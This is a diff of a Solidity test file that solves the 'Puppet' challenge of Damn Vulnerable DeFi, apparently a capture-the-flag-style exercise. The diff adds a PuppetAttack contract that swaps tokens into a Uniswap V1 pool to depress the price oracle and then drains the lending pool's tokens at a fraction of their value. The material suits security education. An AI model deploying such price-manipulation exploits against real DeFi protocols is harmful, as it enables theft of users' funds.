@@ -61,7 +61,9 @@ contract PuppetChallenge is Test {
 
         // Add initial token and ETH liquidity to the pool
         token.approve(address(uniswapV1Exchange), UNISWAP_INITIAL_TOKEN_RESERVE);
-        uniswapV1Exchange.addLiquidity{value: UNISWAP_INITIAL_ETH_RESERVE}(
+        uniswapV1Exchange.addLiquidity{
+            value: UNISWAP_INITIAL_ETH_RESERVE
+        }(
             0, // min_liquidity
             UNISWAP_INITIAL_TOKEN_RESERVE,
             block.timestamp * 2 // deadline
@@ -91,8 +93,11 @@ contract PuppetChallenge is Test {
     /**
      * CODE YOUR SOLUTION HERE
      */
+
     function test_puppet() public checkSolvedByPlayer {
-        
+        PuppetAttack att = new PuppetAttack{value: 25 ether}(recovery, token, lendingPool, uniswapV1Exchange);
+        token.transfer(address(att), 1000e18);
+        att.pwn();
     }
 
     // Utility function to calculate Uniswap prices
@@ -115,4 +120,43 @@ contract PuppetChallenge is Test {
         assertEq(token.balanceOf(address(lendingPool)), 0, "Pool still has tokens");
         assertGe(token.balanceOf(recovery), POOL_INITIAL_TOKEN_BALANCE, "Not enough tokens in recovery account");
     }
+}
+
+contract PuppetAttack {
+    DamnValuableToken token;
+    PuppetPool pool;
+    IUniswapV1Exchange uniswapPair;
+    address recovery;
+    uint8 DEPOSIT_FACTOR = 2;
+    uint256 tokenInPool = 100_000e18;
+
+    constructor(address _recovery, DamnValuableToken _token, PuppetPool _pool, IUniswapV1Exchange _uniswapPair)
+        payable {
+        recovery = _recovery;
+        token = _token;
+        pool = _pool;
+        uniswapPair = _uniswapPair;
+    }
+
+    function pwn() external {
+        uint256 dvtBalance = token.balanceOf(address(this));
+        token.approve(address(uniswapPair), dvtBalance);
+        uniswapPair.tokenToEthTransferInput(dvtBalance, 9.9 ether, block.timestamp * 2, address(this));
+        uint256 ethNeeded = (_computeOraclePrice() * tokenInPool * DEPOSIT_FACTOR / 1e18);
+        pool.borrow{value: ethNeeded}(tokenInPool, address(this));
+        _withdraw();
+    }
+
+    function _withdraw() private {
+        (bool ok,) = recovery.call{value: address(this).balance}("");
+        require(ok);
+        token.transfer(recovery, token.balanceOf(address(this)));
+    }
+
+    function _computeOraclePrice() private view returns (uint256) {
+        // calculates the price of the token in wei according to Uniswap pair
+        return address(uniswapPair).balance * (10 ** 18) / token.balanceOf(address(uniswapPair));
+    }
+
+    receive() external payable {}
 }
